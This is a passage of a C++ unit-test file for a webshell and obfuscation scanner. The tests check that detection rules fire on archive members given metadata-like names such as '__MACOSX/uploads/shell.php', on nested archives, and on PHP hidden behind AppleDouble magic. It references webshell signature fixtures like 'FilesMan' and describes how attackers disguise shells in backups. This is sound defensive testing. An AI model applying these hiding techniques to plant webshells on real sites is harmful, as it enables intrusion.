        const Terminal terminal(/*useAnsi=*/false);
        const TerminalCaps caps = TerminalCaps::detect();
        testing::internal::CaptureStdout();
        const int code = CheckUseCase(terminal, caps).execute(args);
        const std::string checked = testing::internal::GetCapturedStdout();
        EXPECT_EQ(code, 2);

        for (const auto& [label, written] : {std::pair{"CSV", csv.str()},
                                             std::pair{"text", text.str()},
                                             std::pair{"check", checked}}) {
            for (const auto& address : addresses) {
                EXPECT_NE(written.find(address), std::string::npos)
                    << label << " never names " << address << ":\n" << written;
            }
        }
    }
}

// ===========================================================================
// An archive's own name is not a directory
// ===========================================================================
//
// The directories a location prior reads for a member are the container's real directories
// on disk and the directories the member's stored name really has. The container's file
// name is neither: an upload called `revslider-6.7.zip` is one file somebody named, and the
// OBF010 product prior it once granted to every member below its top was a name claiming a
// directory. A nested archive's name is no more a directory than the outer one's.

class ArchiveContainerNameTest : public ArchiveMemberFixture {};

TEST_F(ArchiveContainerNameTest, AnArchivesOwnNameIsNotADirectoryItsMembersSitUnder) {
    const std::string gz(kGzuncompressEval);
    const std::string pack(kPackHex);
    const fs::path scanned = root / "scanned";
    fs::create_directories(scanned / "revslider");
    fs::create_directories(root / "built");

    const fs::path named = scanned / "revslider-6.7.zip";
    writeZip(named, {{"x/y.php", gz}}, ZIP_OPSYS_UNIX);
    const fs::path other = scanned / "other.zip";
    writeZip(other, {{"x/y.php", gz}, {"a/revslider/y.php", gz}, {"revslider/y.php", gz}},
             ZIP_OPSYS_UNIX);
    const fs::path inRealDirectory = scanned / "revslider" / "other.zip";
    writeZip(inRealDirectory, {{"x/y.php", gz}}, ZIP_OPSYS_UNIX);
    const fs::path inner = root / "built" / "revslider-6.7.zip";
    writeZip(inner, {{"x/y.php", gz}}, ZIP_OPSYS_UNIX);
    const fs::path outer = scanned / "outer.zip";
    writeZip(outer, {{"revslider-6.7.zip", lyxbosa::test::fixtures::readBytes(inner)}},
             ZIP_OPSYS_UNIX);
    const fs::path vendorAtTop = scanned / "vendor-at-top.zip";
    writeZip(vendorAtTop, {{"vendor/lib/x.php", pack}, {"lib/x.php", pack}}, ZIP_OPSYS_UNIX);

    AppConfig config = Config::loadFromString(Config::generateDefault());
    config.scan.directories = {pathToUtf8(scanned)};
    config.scan.recursive = true;
    config.archives.exhaustive = true;   // the nested zip is not code and is otherwise shut
    config.actions.quarantine.enabled = false;
    Scanner scanner(config);
    scanner.setPreCount(false);
    const ScanResult result = scanner.scan();

    const auto codesAt = [&result](const std::string& address) {
        std::set<std::string> codes;
        for (const auto& file : result.files) {
            if (pathToUtf8(file.path) != address) continue;
            for (const auto& match : file.matches) codes.insert(match.category);
        }
        return codes;
    };
    EXPECT_EQ(codesAt(pathToUtf8(named) + "!x/y.php").count("OBF010"), 1u)
        << "the archive's own name was read as a directory its member sits under";
    EXPECT_EQ(codesAt(pathToUtf8(other) + "!x/y.php").count("OBF010"), 1u);
    EXPECT_EQ(codesAt(pathToUtf8(outer) + "!revslider-6.7.zip!x/y.php").count("OBF010"), 1u)
        << "a nested archive's name was read as a directory its member sits under";

    // The directories that are real still count.
    EXPECT_EQ(codesAt(pathToUtf8(other) + "!a/revslider/y.php").count("OBF010"), 0u);
    EXPECT_EQ(codesAt(pathToUtf8(other) + "!revslider/y.php").count("OBF010"), 0u)
        << "a member's first directory is a directory it really has";
    EXPECT_EQ(codesAt(pathToUtf8(inRealDirectory) + "!x/y.php").count("OBF010"), 0u)
        << "the container's own directory on disk is a real directory";
    EXPECT_EQ(codesAt(pathToUtf8(vendorAtTop) + "!vendor/lib/x.php").count("OBF003"), 0u);
    EXPECT_EQ(codesAt(pathToUtf8(vendorAtTop) + "!lib/x.php").count("OBF003"), 1u);
}

// ===========================================================================
// A member named like metadata is a member
// ===========================================================================
//
// A Mac writes `__MACOSX/` and `._name` into a zip, Finder leaves `.DS_Store` in a folder and
// Windows Explorer leaves `Thumbs.db`. None of those names says what a file holds: the attacker
// chooses a file's name, and a backup copies it unchanged. So a member spelled like one is
// selected exactly as the file of that name is - the operator's patterns, the priority policy
// outside exhaustive mode and the guards, and nothing else - and what keeps a real AppleDouble
// stub out of the report is its bytes, inside an archive as on disk.
//
// Every zip here deflates what it holds, and every container is checked not to carry the bytes a
// case looks for: a stored member is readable in its container, and a rule matching the container
// would stand in for a member nobody opened.

namespace {

using lyxbosa::test::fixtures::appleDoubleStub;
using lyxbosa::test::fixtures::compressionMethodsOf;
using lyxbosa::test::fixtures::readBytes;

// `backslash`: the name holds one, so on Windows no file can carry it.
struct MetadataName {
    const char* name;
    bool backslash;
};

constexpr MetadataName kMetadataNames[] = {
    {"__MACOSX/uploads/shell.php", false},
    {"__MACOSX/uploads/._shell.php", false},
    {"uploads/__MACOSX/shell.php", false},
    {"uploads/._shell.php", false},
    {"uploads/._shell", false},
    {"uploads/.DS_Store", false},
    {"uploads/Thumbs.db", false},
    {"uploads/__MACOSX\\shell.php", true},
    {"uploads/a\\._shell.php", true},
};

constexpr std::string_view kZipInAZip = "zip in a zip";

class ArchiveMetadataNameTest : public OnDiskFixture {
protected:
    // `members` written under `dir` in every shape a backup arrives in - a zip with a Unix host
    // byte, one with a DOS host byte, a tar.gz, and a zip holding a zip that holds them - and,
    // where the platform lets a file carry the name, as loose files under `dir/loose`. Returns
    // each container's label and the prefix its members' addresses begin with.
    //
    // `absentFromContainers` is checked to be in no container's own bytes. Empty when a member is
    // incompressible: deflate keeps such a member's bytes as they are, and the case then checks
    // that no container raised anything of its own instead.
    std::vector<std::pair<std::string, std::string>> writeEverywhere(
        const fs::path& dir, const std::vector<std::pair<std::string, std::string>>& members,
        std::string_view absentFromContainers) {
        fs::create_directories(dir);

        const auto deflatedZip = [&](const fs::path& path,
                                     const std::vector<std::pair<std::string, std::string>>& held,
                                     uint8_t host) {
            writeZip(path, held, host, ZIP_CM_DEFLATE);
            const auto methods = compressionMethodsOf(path);
            EXPECT_EQ(methods.size(), held.size()) << path;
            for (const auto& [name, method] : methods) {
                EXPECT_EQ(method, 8u) << name << " in " << path << " is not deflated";
            }
        };

        const fs::path unixZip = dir / "unix-host.zip";
        const fs::path dosZip = dir / "dos-host.zip";
        const fs::path tarGz = dir / "backup.tar.gz";
        const fs::path outerZip = dir / "outer.zip";
        deflatedZip(unixZip, members, ZIP_OPSYS_UNIX);
        deflatedZip(dosZip, members, ZIP_OPSYS_DOS);

        std::string tar;
        for (const auto& [name, body] : members) {
            appendTarMember(tar, name, body);
        }
        tar += endOfTar();
        const std::string gz = gzipCompress(tar);
        std::ofstream(tarGz, std::ios::binary).write(gz.data(), static_cast<std::streamsize>(gz.size()));

        const fs::path built = root / ("built-" + pathToUtf8(dir.filename()));
        fs::create_directories(built);
        deflatedZip(built / "inner.zip", members, ZIP_OPSYS_UNIX);
        deflatedZip(outerZip, {{"nested/inner.zip", readBytes(built / "inner.zip")}}, ZIP_OPSYS_UNIX);

        for (const fs::path& container : {unixZip, dosZip, tarGz, outerZip}) {
            if (absentFromContainers.empty()) break;
            EXPECT_EQ(readBytes(container).find(absentFromContainers), std::string::npos)
                << container << " carries its members' bytes in its own";
        }

        for (const auto& [name, body] : members) {
            if (!looseFileCanCarry(name)) continue;
            const fs::path file = dir / "loose" / pathFromUtf8(name);
            fs::create_directories(file.parent_path());
            std::ofstream(file, std::ios::binary).write(body.data(), static_cast<std::streamsize>(body.size()));
        }

        return {{"unix-host.zip", pathToUtf8(unixZip) + "!"},
                {"dos-host.zip", pathToUtf8(dosZip) + "!"},
                {"backup.tar.gz", pathToUtf8(tarGz) + "!"},
                {std::string(kZipInAZip), pathToUtf8(outerZip) + "!nested/inner.zip!"}};
    }

    static bool looseFileCanCarry(std::string_view name) {
        return !name.empty() &&
               (name.find('\\') == std::string_view::npos || !whyNoNameCanHoldABackslashHere());
    }

    // The address a walk gives the loose file of `name` under `dir/loose`.
    static std::string looseAddress(const fs::path& dir, std::string_view name) {
        return pathToUtf8((dir / "loose" / pathFromUtf8(name)).make_preferred());
    }

    static AppConfig configFor(const fs::path& dir, bool exhaustive, bool includeList) {
        AppConfig config = Config::loadFromString(Config::generateDefault());
        config.scan.directories = {pathToUtf8(dir)};
        config.scan.recursive = true;
        config.actions.quarantine.enabled = false;
        config.archives.exhaustive = exhaustive;
        if (!includeList) {
            config.scan.include.clear();
        }
        return config;
    }

    static ScanResult scanWith(const AppConfig& config) {
        Scanner scanner(config);
        scanner.setPreCount(false);
        return scanner.scan();
    }

    // Every row's rule codes, keyed by the row's address.
    static std::map<std::string, std::set<std::string>> codesByAddress(const ScanResult& result) {
        std::map<std::string, std::set<std::string>> codes;
        for (const auto& file : result.files) {
            auto& at = codes[pathToUtf8(file.path)];
            for (const auto& match : file.matches) {
                at.insert(match.category);
            }
        }
        return codes;
    }
};

}  // namespace

// Each name holding the WS006 signature is opened and fires in every container, and the file of
// that name fires alike: in the default selection, in exhaustive mode, and in exhaustive mode with
// no include list. `Thumbs.db` is the one name the default include list does not name, so it is
// left shut there as a file and as a member, and read once no include list stands in the way. A
// zip inside a zip is not code, so outside exhaustive mode the inner zip is left shut whatever its
// members are called.
TEST_F(ArchiveMetadataNameTest, EachNameHoldingAWebshellIsOpenedAndFiresAsTheFileOfThatNameDoes) {
    const std::string content(kFilesMan);
    std::vector<std::pair<std::string, std::string>> members;
    for (const MetadataName& n : kMetadataNames) {
        members.emplace_back(n.name, content);
    }
    const fs::path dir = root / "metadata";
    const auto containers = writeEverywhere(dir, members, "FilesMan");

    struct Selection {
        const char* label;
        bool exhaustive;
        bool includeList;
        size_t membersScanned;
    };
    const size_t named = std::size(kMetadataNames);
    for (const Selection& selection :
         {Selection{"default selection", false, true, 3 * (named - 1)},
          Selection{"exhaustive", true, true, 4 * (named - 1) + 1},
          Selection{"exhaustive, no include list", true, false, 4 * named + 1}}) {
        SCOPED_TRACE(selection.label);
        const ScanResult result =
            scanWith(configFor(dir, selection.exhaustive, selection.includeList));
        EXPECT_EQ(result.archives.membersScanned, selection.membersScanned);
        auto codes = codesByAddress(result);

        for (const MetadataName& n : kMetadataNames) {
            SCOPED_TRACE(n.name);
            const bool selected =
                !selection.includeList || std::string_view(n.name) != "uploads/Thumbs.db";

            std::optional<bool> fileFires;
            if (looseFileCanCarry(n.name)) {
                fileFires = codes[looseAddress(dir, n.name)].count("WS006") == 1;
                EXPECT_EQ(*fileFires, selected) << "the loose file";
            }
            for (const auto& [label, prefix] : containers) {
                const bool reached = selection.exhaustive || label != kZipInAZip;
                const bool memberFires = codes[prefix + n.name].count("WS006") == 1;
                EXPECT_EQ(memberFires, selected && reached) << label;
                if (fileFires && reached) {
                    EXPECT_EQ(memberFires, *fileFires)
                        << label << ": the member and the file of its name answer differently";
                }
            }
        }
    }
}

// A real AppleDouble stub named `._index.php` raises nothing, loose or as a member of any
// container, in either mode - and it was read, which is what makes the silence mean something.
// Beside it, the four bytes of AppleDouble magic in front of PHP carrying an OBF036 payload are
// reported, loose and as a member: the exemption is for the stub's bytes, not for its magic and
// not for its name.
TEST_F(ArchiveMetadataNameTest, ARealStubRaisesNothingAndPhpBehindItsMagicIsReported) {
    const std::string stub = appleDoubleStub(std::string_view("0081;66e8a1c0;Safari;\0", 22));
    const std::string magicThenPhp =
        std::string("\x00\x05\x16\x07\x00\x02\x00\x00" "Mac OS X        ", 24) + blobThenPhp();
    const std::vector<std::pair<std::string, std::string>> members = {
        {"__MACOSX/site/._index.php", stub},
        {"site/._index.php", stub},
        {"site/._shell.php", magicThenPhp},
    };
    const fs::path dir = root / "stubs";
    // The stage in front of the payload is incompressible, so no container hides it; none of them
    // is source, and each one's own row is checked to be empty below.
    const auto containers = writeEverywhere(dir, members, "");

    for (const bool exhaustive : {false, true}) {
        SCOPED_TRACE(exhaustive ? "exhaustive" : "default selection");
        const ScanResult result = scanWith(configFor(dir, exhaustive, true));
        EXPECT_EQ(result.archives.membersScanned, exhaustive ? 13u : 9u)
            << "a member these cases are about was not read";
        auto codes = codesByAddress(result);

        const auto expect = [&](const std::string& address, bool isStub, const char* where) {
            SCOPED_TRACE(address);
            if (isStub) {
                EXPECT_TRUE(codes[address].empty()) << where << " raised something for a stub";
            } else {
                EXPECT_EQ(codes[address].count("OBF036"), 1u)
                    << where << ": AppleDouble magic hid the stage behind a PHP open tag";
            }
        };
        for (const auto& [label, prefix] : containers) {
            if (label == kZipInAZip) continue;
            const std::string container = prefix.substr(0, prefix.size() - 1);
            EXPECT_TRUE(codes[container].empty()) << container << " raised something of its own";
        }
        for (const auto& [name, body] : members) {
            const bool isStub = body == stub;
            expect(looseAddress(dir, name), isStub, "the loose file");
            for (const auto& [label, prefix] : containers) {
                if (!exhaustive && label == kZipInAZip) continue;
                expect(prefix + name, isStub, label.c_str());
            }
        }
    }
}

// A member stored as `\` is a file of that one-character name on Linux: unzip, 7-Zip, PHP's
// ZipArchive, PclZip, Python and GNU tar all write it so. It has no extension, and a name without
// one is code to the priority policy as it is to `!ext`, so it is opened in either mode, and it
// fires as the file of that name does. A member stored with no name at all is opened too: 7-Zip
// writes its bytes to a file named after the archive, and Python's tarfile to the destination path
// itself, so they can reach a disk, and nothing about them is a reason to leave them unread.
TEST_F(ArchiveMetadataNameTest, AMemberStoredAsABackslashOrWithNoNameIsOpened) {
    const std::string content(kFilesMan);
    const std::vector<std::pair<std::string, std::string>> members = {
        {"\\", content},
        {"", content},
        {"ok.php", content},
    };
    const fs::path dir = root / "unnamed";
    const auto containers = writeEverywhere(dir, members, "FilesMan");

    for (const bool exhaustive : {false, true}) {
        SCOPED_TRACE(exhaustive ? "exhaustive" : "default selection");
        const ScanResult result = scanWith(configFor(dir, exhaustive, true));
        EXPECT_EQ(result.archives.membersScanned, exhaustive ? 13u : 9u);
        EXPECT_EQ(result.archives.totalSkipped(), exhaustive ? 0u : 1u)
            << archive::membersNotScannedLine(result.archives) << " - only the inner zip";
        auto codes = codesByAddress(result);

        if (looseFileCanCarry("\\")) {
            EXPECT_EQ(codes[looseAddress(dir, "\\")].count("WS006"), 1u) << "the loose file";
        }
        for (const auto& [label, prefix] : containers) {
            if (!exhaustive && label == kZipInAZip) continue;
            SCOPED_TRACE(label);
            EXPECT_EQ(codes[prefix + "\\"].count("WS006"), 1u);
            EXPECT_EQ(codes[prefix].count("WS006"), 1u) << "no row for the member with no name";
            EXPECT_EQ(codes[prefix + "ok.php"].count("WS006"), 1u);
        }
    }
}

// A member with no name is addressed by its container and the separator and nothing after it, and
// that address is never the container's own. The container is a STORED zip here on purpose, so
// its own bytes carry the signature and it has a row of its own; both rows are there, apart, in
// the scan result, the JSON, the CSV, the text report and `check`.
TEST_F(ArchiveMetadataNameTest, AMemberWithNoNameIsNeverTheContainersRow) {
    const std::string content(kFilesMan);
    const fs::path dir = root / "stored";
    fs::create_directories(dir);
    const fs::path zip = dir / "stored.zip";
    writeZip(zip, {{"", content}}, ZIP_OPSYS_UNIX, ZIP_CM_STORE);
    ASSERT_NE(readBytes(zip).find("FilesMan"), std::string::npos)
        << "the container must carry the signature in its own bytes for this case to mean anything";

    const std::string container = pathToUtf8(zip);
    const std::string member = container + "!";
    const ScanResult result = scanWith(configFor(dir, false, true));
    auto codes = codesByAddress(result);
    EXPECT_EQ(codes[container].count("WS006"), 1u) << "the container's own row";
    EXPECT_EQ(codes[member].count("WS006"), 1u) << "the member's row";
    EXPECT_EQ(result.files.size(), 2u);

    const std::string containerShown = pathForDisplay(pathFromUtf8(container));
    const std::string memberShown = pathForDisplay(pathFromUtf8(member));
    ASSERT_NE(containerShown, memberShown);

    std::ostringstream json;
    {
        JsonReportWriter writer(json);
        writer.begin();
        for (const auto& file : result.files) writer.onFile(file);
        writer.end(result, false);
    }
    const nlohmann::json document = nlohmann::json::parse(json.str());
    std::set<std::string> jsonPaths;
    for (const auto& file : document.at("files")) {
        jsonPaths.insert(file["path"].get<std::string>());
    }
    EXPECT_EQ(jsonPaths, (std::set<std::string>{containerShown, memberShown})) << json.str();

    std::ostringstream csv;
    {
        CsvReportWriter writer(csv);
        writer.begin();
        for (const auto& file : result.files) writer.onFile(file);
        writer.end(result, false);
    }
    std::set<std::string> csvPaths;
    {
        std::istringstream lines(csv.str());
        std::string line;
        std::getline(lines, line);   // the header
        while (std::getline(lines, line)) {
            csvPaths.insert(line.substr(0, line.find(',')));
        }
    }
    EXPECT_EQ(csvPaths, (std::set<std::string>{containerShown, memberShown})) << csv.str();

    std::ostringstream text;
    {
        ResultPrinter printer(text, /*color=*/false, /*width=*/400);
        for (const auto& file : result.files) printer.printFileResult(file);
    }
    for (const std::string& shown : {containerShown, memberShown}) {
        EXPECT_NE(text.str().find("[!] " + shown + " ["), std::string::npos)
            << "no line of its own for " << shown << ":\n" << text.str();
    }

    CliArgs args;
    args.checkFile = container;
    const Terminal terminal(/*useAnsi=*/false);
    const TerminalCaps caps = TerminalCaps::detect();
    testing::internal::CaptureStdout();
    const int code = CheckUseCase(terminal, caps).execute(args);
    const std::string checked = testing::internal::GetCapturedStdout();
    EXPECT_EQ(code, 2);
    EXPECT_NE(checked.find("File: " + containerShown + "\n"), std::string::npos) << checked;
    EXPECT_NE(checked.find("Member: " + memberShown + "\n"), std::string::npos) << checked;
}
